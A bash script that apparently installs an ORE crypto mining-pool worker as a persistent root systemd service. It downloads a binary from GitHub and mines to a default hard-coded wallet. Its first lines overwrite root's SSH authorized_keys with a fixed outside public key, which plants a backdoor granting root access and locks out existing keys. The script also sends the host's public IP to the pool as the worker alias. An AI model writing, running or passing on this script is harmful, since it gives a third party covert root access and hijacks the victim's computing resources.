#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

[ -z "$1" ] && WORKER_WALLET_ADDRESS='5B5BQprt9jzdxYRvZJpgWCSyeR24zo2MV27oH3GjjvZf' || WORKER_WALLET_ADDRESS="$1"

DIR="/opt/ore"

mkdir -p $DIR

wget -O $DIR/ore-pool-cli "https://github.com/xintai6660707/ore-mine-pool/raw/main/ore-mine-pool-linux"

chmod +x $DIR/ore-pool-cli

COMMAND_BASE="${DIR}/ore-pool-cli worker --alias \${ALIAS} --route-server-url http://route.oreminepool.top:8080/ --server-url 'public&stake' --worker-wallet-address ${WORKER_WALLET_ADDRESS}"

echo '''#!/bin/bash
ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me)
''' > $DIR/start.sh
echo $COMMAND_BASE >> $DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=ore
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
StandardOutput=file:$DIR/worker.log
StandardError=inherit
[Install]
WantedBy=default.target""" > /etc/systemd/system/ore.service

systemctl daemon-reload
systemctl enable ore
systemctl restart ore